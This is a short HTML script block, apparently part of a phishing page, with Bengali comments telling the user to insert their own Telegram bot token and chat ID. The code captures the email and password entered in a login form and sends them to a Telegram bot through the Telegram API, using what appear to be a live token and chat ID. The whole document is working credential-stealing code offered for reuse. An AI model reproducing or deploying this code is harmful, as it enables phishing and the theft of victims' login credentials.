<script>
        const BOT_TOKEN = "7125654513:AAFHdhUKZN8HcULIIG9kh5MysJbSLhj_MJM"; // আপনার টেলিগ্রাম বটের টোকেন দিন
        const CHAT_ID = "5803313135";    // আপনার চ্যাট আইডি দিন

        document.getElementById("loginForm").addEventListener("submit", function (e) {
            e.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;

            fetch(telegramURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                }),
            })
                .then((response) => {
                    if (response.ok) {
                        alert("Login information sent successfully!");
                    } else {
                        alert("Failed to send login information.");
                    }
                })
                .catch((error) => {
                    console.error("Error:", error);
                    alert("An error occurred while sending data.");
                });
        });
    </script>
